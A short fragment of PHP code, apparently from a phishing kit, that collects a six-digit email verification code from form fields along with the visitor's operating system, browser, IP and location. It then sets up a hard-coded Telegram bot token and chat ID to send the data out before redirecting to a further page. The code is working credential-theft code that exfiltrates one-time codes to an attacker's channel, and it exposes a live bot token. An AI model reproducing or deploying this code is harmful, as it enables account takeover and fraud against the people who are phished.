...
$message = "\r\nCODIGO EMAIL 2:".$_POST['num1']."".$_POST['num2']."".$_POST['num3']."".$_POST['num4']."".$_POST['num5']."".$_POST['num6']."\r\n";
$message .= " SO= ".$user_os." ".$navegador." ".$userp." ".$pais." ".$region." ".$ciudad."\r\n";
$apiToken = "5786833417:AAFNO4qHSs3WvYpmMOVYl6zxMBDKrUpMJ54";


$data = [
  'chat_id' => '-1001798720300',
...
}else{ header ('location: index10.html'); exit();
 }
